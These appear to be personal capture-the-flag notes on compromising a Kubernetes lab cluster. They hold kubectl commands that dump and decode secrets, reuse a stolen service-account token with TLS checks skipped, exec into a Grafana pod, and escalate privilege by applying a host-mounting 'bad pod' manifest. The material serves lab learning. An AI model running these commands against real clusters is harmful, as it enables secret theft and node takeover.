# kubernetes
[https://kubernetes.io/docs/reference/kubectl/cheatsheet/](https://kubernetes.io/docs/reference/kubectl/cheatsheet/) 

`kubectl get pods`

You can check your permissions using `kubectl auth can-i --list`

Kubernetes stores secret values in resources called Secrets these then get mounted into pods either as environment variables or files.

You can use `kubectl` to list and get secrets. The content of the secret is stored base64 encoded.

`./kubectl get secrets`

`kubectl get secret secretflag -o 'json'`

Some interesting Kubernetes objects to look for would be `nodes`,  `deployments`, `services`, `ingress`, `jobs`... But the service account you control does not have access to any of them.

However, by default Kubernetes creates environment variables containing the host and port of the other services running in the cluster.

Running `env` you will see there is a `Grafana` service running in the cluster.

Kubernetes stores the token of the service account running a pod in `/var/run/secrets/kubernetes.io/serviceaccount/token`.   

specify kubernetes config file with:

```text-plain
KUBECONFIG=diana.kubeconfig kubectl --server https://10.10.92.76:6443 --insecure-skip-tls-verify version
```

```text-plain
kubectl --insecure-skip-tls-verify --server=https://team.thm:6443 auth can-i --list --token "$(cat token.txt)"	
```

```text-plain
./kubectl auth can-i --list --token=${TOKEN}

kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://team.thm:6443 -n kube-system get secret flag3 -o json | jq -r '.data | map_values(@base64d)'

./kubectl exec -it grafana-57454c95cb-v4nrk --token=${TOKEN} -- /bin/bash
```

Namespaces
----------

`kubectl get namespace` lists all the available namespaces

`-n` defines the namespace to use. use `get secret <secret_name>` to get details and output it in a format yaml,json etc., to get it's value.

Nodes
-----

`kubectl get node`, to  list nodes and output in yaml,json for it's details.

privilege escalation

```text-plain
kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://team.thm:6443 -n default apply -f host.yaml
```

Server Side Apply helps users and controllers manage their resources through declarative configurations. Clients can create and modify their [objects](https://kubernetes.io/docs/concepts/overview/working-with-objects/kubernetes-objects/) declaratively by sending their fully specified intent.

```text-plain
kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://team.thm:6443 -n default exec -it host bash
```

“host” is necessary

[https://bishopfox.com/blog/kubernetes-pod-privilege-escalation](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation) 

[https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml](https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml) 

The image is available in minikube's local docker registry therefore you just need to tell Kubernetes to use the local version instead of pulling it. You can achieve this by adding `imagePullPolicy: IfNotPresent` to your "bad" pod container. Once that is done you can run `kubectl apply` to create the pod.